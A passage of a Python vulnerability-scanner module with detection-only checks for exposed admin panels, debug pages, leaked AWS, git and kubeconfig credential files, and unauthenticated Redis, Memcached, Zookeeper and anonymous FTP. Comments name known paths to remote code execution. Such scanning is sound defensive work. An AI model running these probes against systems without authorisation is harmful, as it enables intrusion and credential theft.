    ("/confluence", "Confluence", "Confluence"),
]


async def check_exposed_devops_tool_panel(host: str) -> dict | None:
    """
    Checks common paths for internal DevOps tooling (Jenkins, Jira,
    Confluence) reachable on the same host - distinct from subdomain
    enumeration, this catches tools mounted as a path under the main
    app rather than a separate subdomain. An internet-reachable Jenkins
    instance in particular is a frequent path to full RCE if script
    console access isn't locked down (not tested here - detection only).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path, marker, tool in _DEVOPS_PANEL_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and marker in resp.text[:5000]:
                    return {
                        "vuln_type": "exposed_devops_tool_panel",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path}: a live {tool} instance is reachable "
                            f"(matched marker: {marker!r}) - further attack surface, "
                            f"potential RCE if unauthenticated script/admin access is also "
                            f"open (not tested here)."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: DevOps panel check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 92. Exposed phpMyAdmin
# ---------------------------------------------------------------------
_PHPMYADMIN_PATHS = ["/phpmyadmin", "/pma", "/dbadmin", "/phpMyAdmin"]


async def check_exposed_phpmyadmin(host: str) -> dict | None:
    """
    Checks common paths for a live phpMyAdmin instance - a direct
    database administration interface. Detection only; credentials are
    never attempted (most programs exclude credential guessing
    regardless of discovery method, same reasoning as
    check_exposed_admin_panel).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _PHPMYADMIN_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and re.search(r"phpMyAdmin", resp.text[:5000], re.IGNORECASE):
                    return {
                        "vuln_type": "exposed_phpmyadmin",
                        "severity": "high",
                        "evidence": (
                            f"{base}{path}: a live phpMyAdmin instance is reachable - direct "
                            f"database administration interface exposed. Credentials not "
                            f"attempted; most programs exclude credential guessing."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: phpMyAdmin check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 93. Exposed ELMAH error log (.NET)
# ---------------------------------------------------------------------
async def check_exposed_elmah_axd(host: str) -> dict | None:
    """
    Checks for a live elmah.axd endpoint - ELMAH logs full unhandled
    .NET exceptions including stack traces, request details, and
    sometimes cookies/session data for every error the application has
    ever thrown, all in one unauthenticated feed.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/elmah.axd")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: ELMAH check failed for %s: %s", host, exc)
        return None

    body = resp.text[:5000]
    if resp.status_code == 200 and ("Error Log for" in body or "elmah" in body.lower()):
        return {
            "vuln_type": "exposed_elmah_error_log",
            "severity": "high",
            "evidence": (
                f"{base}/elmah.axd is publicly accessible - full unhandled-exception log "
                f"including stack traces and request details for every application error, "
                f"unauthenticated."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 94. Exposed Trace.axd (.NET application trace viewer)
# ---------------------------------------------------------------------
async def check_exposed_trace_axd(host: str) -> dict | None:
    """
    Checks for a live trace.axd endpoint - ASP.NET's built-in request
    trace viewer, which can disclose session IDs, ViewState, full
    request/response headers, and application internals for recent
    requests when left enabled in production.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/trace.axd")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Trace.axd check failed for %s: %s", host, exc)
        return None

    body = resp.text[:5000]
    if resp.status_code == 200 and ("Application Trace" in body or "Request Details" in body):
        return {
            "vuln_type": "exposed_trace_axd",
            "severity": "critical",
            "evidence": (
                f"{base}/trace.axd is publicly accessible - ASP.NET request trace viewer "
                f"can disclose session IDs, ViewState, and full request/response details "
                f"for recent application traffic."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 95. Laravel debug mode exposure
# ---------------------------------------------------------------------
_LARAVEL_DEBUG_MARKERS = ["\"Whoops\\\\Exception", "ignition", "vendor/laravel", "Symfony\\\\Component\\\\Debug"]


async def check_laravel_debug_mode_exposure(host: str) -> dict | None:
    """
    Requests a deliberately nonexistent path and checks for Laravel's
    detailed debug error page (Ignition/Whoops), which discloses full
    stack traces, .env-adjacent config values, and file paths when
    APP_DEBUG=true in production. Complements check_debug_console_exposure
    (batch 7, which covers Werkzeug/Rails/Symfony/phpinfo) with Laravel
    specifically.
    """
    base = host.rstrip("/")
    probe_path = "/swas-laravel-debug-probe-" + uuid.uuid4().hex[:8]
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + probe_path)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Laravel debug mode check failed for %s: %s", host, exc)
        return None

    body = resp.text[:8000]
    for marker in _LARAVEL_DEBUG_MARKERS:
        if marker in body:
            return {
                "vuln_type": "laravel_debug_mode_exposure",
                "severity": "critical",
                "evidence": (
                    f"{base}{probe_path}: a request to a deliberately nonexistent path "
                    f"triggered Laravel's debug error page (matched {marker!r}) - "
                    f"APP_DEBUG=true in production, full stack traces and config values "
                    f"disclosed on every error."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 96. .git/config with embedded credentials
# ---------------------------------------------------------------------
_GIT_CONFIG_CREDENTIALS_RE = re.compile(r"https?://[^:/@\s]+:[^@/\s]+@", re.IGNORECASE)


async def check_git_config_credentials_leak(host: str) -> dict | None:
    """
    Complements check_git_exposure (batch 3), which detects an exposed
    .git directory generally, with a specific check of .git/config for
    a remote URL containing embedded username:password credentials -
    developers sometimes commit `git remote add origin
    https://user:token@github.com/...` locally, and if .git/ is
    web-exposed, that credential goes with it. Proof is a specific
    URL-with-credentials pattern, not a generic secret-looking string.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/.git/config")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: .git/config credentials check failed for %s: %s", host, exc)
        return None

    if resp.status_code != 200:
        return None
    body = resp.text[:3000]
    if "[remote" not in body:
        return None  # not a real git config file
    match = _GIT_CONFIG_CREDENTIALS_RE.search(body)
    if match:
        redacted = match.group(0).split("://")[0] + "://[redacted]@"
        return {
            "vuln_type": "git_config_embedded_credentials",
            "severity": "critical",
            "evidence": (
                f"{base}/.git/config is exposed and its remote URL contains embedded "
                f"credentials ({redacted}...) - live repository access credentials leaked."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 97. Exposed AWS credentials file
# ---------------------------------------------------------------------
_AWS_CREDENTIALS_PATHS = ["/.aws/credentials", "/aws/credentials", "/.aws/credentials.bak"]


async def check_aws_credentials_file_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible AWS credentials file in the
    standard ~/.aws/credentials INI format. Proof requires BOTH the
    [default] (or named) profile header AND an aws_access_key_id line -
    that specific pairing doesn't occur in unrelated content.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _AWS_CREDENTIALS_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                if re.search(r"^\[\w+\]\s*$", body, re.MULTILINE) and "aws_access_key_id" in body:
                    return {
                        "vuln_type": "exposed_aws_credentials_file",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is publicly accessible and contains a real AWS "
                            f"credentials file (profile header + aws_access_key_id present) "
                            f"- full cloud account access potentially exposed."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: AWS credentials file check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 98. Exposed kubeconfig
# ---------------------------------------------------------------------
_KUBECONFIG_PATHS = ["/.kube/config", "/kubeconfig", "/kube-config.yaml", "/kubeconfig.yaml"]


async def check_kubeconfig_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible kubeconfig file. Proof requires
    the specific combination of "kind: Config" and a "clusters:" block
    with an embedded certificate-authority-data or token field -
    that structural combination is unique to real kubeconfig files,
    not generic YAML.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _KUBECONFIG_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                if (
                    "kind: Config" in body
                    and "clusters:" in body
                    and ("certificate-authority-data" in body or "token:" in body or "client-certificate-data" in body)
                ):
                    return {
                        "vuln_type": "exposed_kubeconfig",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real kubeconfig "
                            f"file (kind: Config + clusters: + embedded credential material) "
                            f"- potential full Kubernetes cluster access exposed."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: kubeconfig exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 99. Exposed Nexus/Artifactory artifact repository manager
# ---------------------------------------------------------------------
async def check_exposed_nexus_artifactory(host: str) -> dict | None:
    """
    Checks common paths for a live Nexus or Artifactory instance -
    distinct from check_exposed_devops_tool_panel (batch 21), which
    covers Jenkins/Jira/Confluence. An exposed artifact repo manager can
    disclose internal package names/versions and, if anonymous deploy
    is enabled, allow supply-chain-poisoning uploads (not tested here).
    """
    base = host.rstrip("/")
    probes = [
        ("/nexus/#browse/welcome", "Sonatype Nexus", "Nexus"),
        ("/service/rest/v1/status", '"data"', "Nexus"),
        ("/artifactory/api/system/ping", "OK", "Artifactory"),
        ("/artifactory/webapp/", "JFrog Artifactory", "Artifactory"),
    ]
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path, marker, tool in probes:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and marker in resp.text[:3000]:
                    return {
                        "vuln_type": "exposed_artifact_repository_manager",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path}: a live {tool} instance is reachable (matched "
                            f"{marker!r}) - internal package names/versions disclosed, "
                            f"potential supply-chain attack surface if anonymous deploy is "
                            f"also enabled (not tested here)."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Nexus/Artifactory check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 100. Exposed RabbitMQ management interface
# ---------------------------------------------------------------------
async def check_exposed_rabbitmq_management(host: str) -> dict | None:
    """
    Checks the RabbitMQ management HTTP API's /api/overview endpoint,
    which (even when it demands auth for most operations) frequently
    responds with a distinctive JSON structure on an unauthenticated
    probe that at minimum confirms the management interface is
    reachable at all - real attack surface for message-queue
    infrastructure that shouldn't be internet-facing.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/api/overview")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: RabbitMQ management check failed for %s: %s", host, exc)
        return None

    body = resp.text[:2000]
    if resp.status_code == 200 and '"rabbitmq_version"' in body:
        return {
            "vuln_type": "exposed_rabbitmq_management",
            "severity": "high",
            "evidence": (
                f"{base}/api/overview returned RabbitMQ cluster info WITHOUT authentication "
                f"(200, contains \"rabbitmq_version\") - the management API is reachable and "
                f"unauthenticated for at least this endpoint."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 101. Exposed Grafana instance
# ---------------------------------------------------------------------
async def check_exposed_grafana(host: str) -> dict | None:
    """
    Checks Grafana's /api/health endpoint, which by design responds
    without authentication and includes a distinctive "database": "ok"
    field alongside a version number - confirms a live Grafana instance
    is reachable. Dashboards themselves may still require login, but a
    reachable instance is real attack surface (default creds, older
    unpatched versions with known CVEs).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/api/health")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Grafana check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, dict) and data.get("database") and "version" in data:
        return {
            "vuln_type": "exposed_grafana_instance",
            "severity": "medium",
            "evidence": (
                f"{base}/api/health confirms a live Grafana instance (version "
                f"{data.get('version')!r}) is reachable - real attack surface (older "
                f"versions carry known CVEs; credentials not attempted)."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 102. Exposed MinIO console
# ---------------------------------------------------------------------
async def check_exposed_minio_console(host: str) -> dict | None:
    """
    Checks for MinIO's distinctive "Server: MinIO" response header or
    login-page marker - MinIO is an S3-compatible object storage server
    frequently self-hosted, and an exposed instance is a direct path to
    every bucket it manages if the console/API isn't properly locked
    down (credentials not attempted here).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/minio/health/live")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: MinIO check failed for %s: %s", host, exc)
        return None

    server_header = resp.headers.get("server", "")
    if resp.status_code == 200 and "minio" in server_header.lower():
        return {
            "vuln_type": "exposed_minio_console",
            "severity": "medium",
            "evidence": (
                f"{base}/minio/health/live confirms a live MinIO instance is reachable "
                f"(Server header: {server_header!r}) - direct object storage attack "
                f"surface; credentials not attempted."
            ),
        }
    return None


# ---------------------------------------------------------------------
# Raw TCP helper - new technique for this module. Everything else in
# detective.py speaks HTTP via httpx; these three checks (103-105) need
# to speak a raw wire protocol instead, since the services in question
# aren't HTTP at all. Kept as a single shared helper so the connect/
# timeout/cleanup logic only needs to be gotten right once.
# ---------------------------------------------------------------------
async def _raw_tcp_probe(host: str, port: int, send: bytes, read_bytes: int = 512) -> bytes | None:
    """
    Opens a raw TCP connection to host:port, sends `send`, reads up to
    read_bytes back, and always closes the connection. Returns None on
    any connection/timeout failure (refused, filtered, wrong protocol)
    rather than raising - these probes hit ports that are very often
    closed/filtered, which is the expected common case, not an error
    worth logging loudly.
    """
    hostname = httpx.URL(host).host or host
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port), timeout=4.0
        )
    except Exception:
        return None
    try:
        writer.write(send)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(read_bytes), timeout=4.0)
        return data
    except Exception:
        return None
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass


# ---------------------------------------------------------------------
# 103. Exposed Redis with no authentication
# ---------------------------------------------------------------------
async def check_exposed_redis_no_auth(host: str) -> dict | None:
    """
    Sends a raw RESP-protocol PING to port 6379 and checks for the
    exact +PONG reply, which only a real Redis server not requiring
    auth will send back to an unauthenticated connection. Zero
    coincidence risk - this is a specific wire-protocol response, not a
    text substring. Unauthenticated Redis is a classic, high-impact
    finding: MODULE LOAD or writing an SSH authorized_keys/cron entry
    via SET+SAVE is a well-known path to full RCE (not attempted here -
    detection only).
    """
    data = await _raw_tcp_probe(host, 6379, b"PING\r\n", read_bytes=64)
    if data and data.startswith(b"+PONG"):
        return {
            "vuln_type": "exposed_redis_no_auth",
            "severity": "critical",
            "evidence": (
                f"{httpx.URL(host).host}:6379 responded +PONG to an unauthenticated PING - "
                f"Redis is reachable with no authentication required. Classic path to RCE "
                f"via MODULE LOAD or writing SSH keys/cron entries (not attempted here)."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 104. Exposed Memcached with no authentication
# ---------------------------------------------------------------------
async def check_exposed_memcached_no_auth(host: str) -> dict | None:
    """
    Sends the Memcached text-protocol "version" command to port 11211
    and checks for the exact "VERSION " reply prefix - Memcached has no
    authentication mechanism at all in its classic protocol, so a
    response here means the entire cache (session data, cached DB
    query results, sometimes tokens) is readable/writable by anyone
    who can reach the port.
    """
    data = await _raw_tcp_probe(host, 11211, b"version\r\n", read_bytes=64)
    if data and data.startswith(b"VERSION "):
        return {
            "vuln_type": "exposed_memcached_no_auth",
            "severity": "high",
            "evidence": (
                f"{httpx.URL(host).host}:11211 responded to the Memcached 'version' command "
                f"({data[:40]!r}) - Memcached has no authentication mechanism at all in its "
                f"classic protocol, so the entire cache contents are readable/writable by "
                f"anyone who can reach this port."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 105. Anonymous FTP login enabled
# ---------------------------------------------------------------------
async def check_exposed_ftp_anonymous_login(host: str) -> dict | None:
    """
    Attempts the FTP anonymous-login sequence (USER anonymous / PASS
    anonymous) against port 21 and checks for a 230 (login successful)
    response code - a fixed, three-digit FTP protocol status code, not
    a text substring. A successful anonymous login means the FTP
    server's file tree (whatever it's configured to expose) is
    directly browsable/downloadable with no credentials.
    """
    hostname = httpx.URL(host).host or host
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, 21), timeout=4.0
        )
    except Exception:
        return None
    try:
        await asyncio.wait_for(reader.read(256), timeout=4.0)  # banner
        writer.write(b"USER anonymous\r\n")
        await writer.drain()
        await asyncio.wait_for(reader.read(256), timeout=4.0)
        writer.write(b"PASS anonymous@example.com\r\n")
        await writer.drain()
        pass_resp = await asyncio.wait_for(reader.read(256), timeout=4.0)
    except Exception:
        return None
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    if pass_resp.startswith(b"230"):
        return {
            "vuln_type": "ftp_anonymous_login_enabled",
            "severity": "high",
            "evidence": (
                f"{hostname}:21 accepted anonymous login (FTP 230 response code) - the "
                f"server's exposed file tree is browsable/downloadable with no credentials."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 106. Exposed CouchDB Fauxton admin UI
# ---------------------------------------------------------------------
async def check_exposed_couchdb_fauxton(host: str) -> dict | None:
    """
    Complements check_nosql_db_exposure (batch 1, which tests CouchDB's
    REST API root) by checking specifically for the Fauxton web admin
    UI being served - a different exposure surface (the UI layer, not
    just the API), reachable at /_utils/ on a standard CouchDB install.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/_utils/")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CouchDB Fauxton check failed for %s: %s", host, exc)
        return None

    body = resp.text[:3000]
    if resp.status_code == 200 and ("Fauxton" in body or "couchdb-fauxton" in body.lower()):
        return {
            "vuln_type": "exposed_couchdb_fauxton_ui",
            "severity": "medium",
            "evidence": (
                f"{base}/_utils/ serves the CouchDB Fauxton admin UI - database "
                f"administration interface reachable; credentials not attempted."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 107. Exposed Zookeeper (four-letter-word command)
# ---------------------------------------------------------------------
async def check_exposed_zookeeper(host: str) -> dict | None:
    """
    Sends Zookeeper's "ruok" (are you ok) four-letter-word command to
    port 2181 and checks for the exact "imok" reply - a fixed protocol
    response, not a text substring. Zookeeper coordinates distributed
    systems (Kafka, Hadoop, etc.) and an exposed instance discloses
    cluster topology and, on older/misconfigured setups, allows further
    four-letter commands that can dump full config or trigger a restart.
    """
    data = await _raw_tcp_probe(host, 2181, b"ruok\n", read_bytes=32)
    if data and data.strip() == b"imok":
        return {
            "vuln_type": "exposed_zookeeper",
            "severity": "high",
            "evidence": (
                f"{httpx.URL(host).host}:2181 responded 'imok' to the Zookeeper 'ruok' "
                f"command - Zookeeper is reachable with no authentication; cluster "
                f"topology and further four-letter administrative commands are exposed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 108. Exposed Apache Solr admin
# ---------------------------------------------------------------------
async def check_exposed_solr_admin(host: str) -> dict | None:
    """
    Checks Solr's /solr/admin/info/system endpoint for its distinctive
    JSON response structure. An exposed, unauthenticated Solr admin
    interface is historically a direct path to RCE via the
    VelocityResponseWriter or config-API params-injection techniques on
    vulnerable versions (not attempted here - detection only).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/solr/admin/info/system?wt=json")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Solr admin check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, dict) and "lucene" in data:
        return {
            "vuln_type": "exposed_solr_admin",
            "severity": "high",
            "evidence": (
                f"{base}/solr/admin/info/system is reachable without authentication "
                f"(valid Solr system-info JSON returned) - historically a direct path to "
                f"RCE on vulnerable versions via VelocityResponseWriter/config-API "
                f"injection (not attempted here)."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 109. Unauthenticated Jenkins script console
# ---------------------------------------------------------------------
async def check_jenkins_script_console_unauth(host: str) -> dict | None:
    """
    Narrower, higher-confidence variant of check_exposed_devops_tool_panel
    (batch 21): that check only confirms a Jenkins instance exists.
    This checks whether /script specifically renders the actual Groovy
    script textarea/form WITHOUT redirecting to a login page - that
    combination means the Script Console is directly reachable, which
    is instant unauthenticated RCE (arbitrary Groovy execution). Proof
    requires the specific script-console form marker, not just any
    Jenkins page.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(base + "/script")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Jenkins script console check failed for %s: %s", host, exc)
        return None

    if resp.status_code != 200:
        return None
    body = resp.text[:5000]
    if 'name="script"' in body and "textarea" in body.lower() and "j_acegi_security_check" not in body:
        return {
            "vuln_type": "jenkins_script_console_unauthenticated",
            "severity": "critical",
            "evidence": (
                f"{base}/script rendered the actual Groovy script console form directly "
                f"(200, textarea present, no redirect to login) - unauthenticated arbitrary "
                f"code execution via the Script Console."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 110. CouchDB _all_dbs unauthenticated database listing
# ---------------------------------------------------------------------
async def check_couchdb_all_dbs_unauth(host: str) -> dict | None:
    """
    Checks CouchDB's /_all_dbs REST endpoint, which on an
    unauthenticated/misconfigured instance returns a JSON array of
    every database name on the server. Distinct from
    check_exposed_couchdb_fauxton (batch 24, the UI layer) - this hits
    the REST API directly and gets a concrete list of database names,
    not just confirmation the admin UI is reachable.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/_all_dbs")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CouchDB _all_dbs check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, list) and all(isinstance(x, str) for x in data):
        return {
            "vuln_type": "couchdb_all_dbs_unauth_listing",
            "severity": "high",
            "evidence": (
                f"{base}/_all_dbs returned a JSON array of {len(data)} database name(s) "
                f"without authentication - full database inventory disclosed, each "
                f"individually a candidate for further unauthenticated read/write testing."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 111. Spring Boot Actuator /env exposure
# ---------------------------------------------------------------------
async def check_spring_boot_env_exposure(host: str) -> dict | None:
    """
    Narrower, higher-severity variant of whatever check_actuator_exposure
    (batch 1) tests generically: this specifically hits /env or
    /actuator/env, which - when reachable - dumps every environment
    variable and Spring property source, routinely including DB
    passwords, API keys, and cloud credentials in plaintext.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in ("/actuator/env", "/env"):
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                try:
                    data = resp.json()
                except Exception:
                    continue
                if isinstance(data, dict) and ("propertySources" in data or "systemEnvironment" in data):
                    return {
                        "vuln_type": "spring_boot_env_exposure",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is reachable without authentication and returns "
                            f"full environment/property-source data - DB passwords, API "
                            f"keys, and cloud credentials are routinely present in this dump."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Spring Boot env exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 112. Django DEBUG=True exposure
# ---------------------------------------------------------------------
_DJANGO_DEBUG_MARKERS = ["DisallowedHost", "You're seeing this error because you have",
                          "Django Version:", "Exception Type:"]


async def check_django_debug_mode_exposure(host: str) -> dict | None:
    """
    Requests a deliberately malformed Host header (which Django rejects
    with DisallowedHost when ALLOWED_HOSTS is enforced) and checks for
    Django's detailed debug error page. Complements
    check_laravel_debug_mode_exposure and check_debug_console_exposure
    with Django specifically - discloses full stack traces, settings
    values, and installed-app internals when DEBUG=True in production.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(base + "/", headers={"Host": "swas-django-debug-probe.invalid"})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Django debug mode check failed for %s: %s", host, exc)
        return None

    body = resp.text[:8000]
    matches = [m for m in _DJANGO_DEBUG_MARKERS if m in body]
    if len(matches) >= 2:
        return {
            "vuln_type": "django_debug_mode_exposure",
            "severity": "critical",
            "evidence": (
                f"{base}: sending an invalid Host header triggered Django's detailed debug "
                f"error page (matched {matches}) - DEBUG=True in production, full stack "
                f"traces and settings values disclosed on every error."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 113. ASP.NET debug mode exposure (Yellow Screen of Death)
# ---------------------------------------------------------------------
_ASPNET_DEBUG_MARKERS = ["Server Error in", "Stack Trace:", "Version Information: Microsoft .NET Framework"]


async def check_aspnet_debug_mode_exposure(host: str) -> dict | None:
    """
    Requests a deliberately nonexistent path and checks for ASP.NET's
    classic detailed error page ("Server Error in '/' Application",
    full stack trace, .NET Framework version) - produced when
    <compilation debug="true"/> is left enabled in web.config for a
    production deployment.
    """
    base = host.rstrip("/")
    probe_path = "/swas-aspnet-debug-probe-" + uuid.uuid4().hex[:8] + ".aspx"
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + probe_path)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: ASP.NET debug mode check failed for %s: %s", host, exc)
        return None

    body = resp.text[:8000]
    matches = [m for m in _ASPNET_DEBUG_MARKERS if m in body]
    if len(matches) >= 2:
        return {
            "vuln_type": "aspnet_debug_mode_exposure",
            "severity": "critical",
            "evidence": (
                f"{base}{probe_path}: returned ASP.NET's detailed debug error page "
                f"(matched {matches}) - <compilation debug=\"true\"/> left enabled in "
                f"production, full stack traces and framework internals disclosed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 114. Node.js/Express default error handler stack trace leak
# ---------------------------------------------------------------------
async def check_express_stack_trace_leak(host: str) -> dict | None:
    """
    Requests a deliberately nonexistent path and checks for Express's
    default error handler output, which in non-production NODE_ENV
    includes the full stack trace with node_modules file paths.
    Complements check_graphql_error_stack_trace_leak with a general
    (non-GraphQL) Express check.
    """
    base = host.rstrip("/")
    probe_path = "/swas-express-debug-probe-" + uuid.uuid4().hex[:8]
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + probe_path)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Express stack trace check failed for %s: %s", host, exc)
        return None

    body = resp.text[:8000]
    if "node_modules" in body and re.search(r"at \S+ \(.*:\d+:\d+\)", body):
        return {
            "vuln_type": "express_stack_trace_leak",
            "severity": "medium",
            "evidence": (
                f"{base}{probe_path}: returned a Node.js/Express stack trace with "
                f"node_modules file paths and line numbers - NODE_ENV is not set to "
                f"production, or a custom error handler is echoing stack details."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 115. Exposed npm-debug.log / yarn-error.log
# ---------------------------------------------------------------------
async def check_npm_debug_log_exposure(host: str) -> dict | None:
    """
    Checks for a deployment leftover npm-debug.log or yarn-error.log at
    the web root - a common CI/build artifact accidentally shipped.
    Discloses internal package registry URLs and, on misconfigured
    private-registry setups, sometimes auth tokens embedded in a
    failed-install error trace.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in ("/npm-debug.log", "/yarn-error.log"):
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                if re.search(r"^\d+ (info|verbose|error) ", body, re.MULTILINE) or "yarn install" in body.lower():
                    return {
                        "vuln_type": "exposed_npm_debug_log",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real npm/yarn "
                            f"install log - discloses internal package registry URLs and "
                            f"potentially auth tokens from a failed private-registry install."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: npm-debug.log check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 116. Exposed .travis.yml
# ---------------------------------------------------------------------
async def check_travis_yml_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible .travis.yml. Travis CI configs
    occasionally contain plaintext deploy keys or misconfigured
    `env: global:` secrets that were meant to stay encrypted -
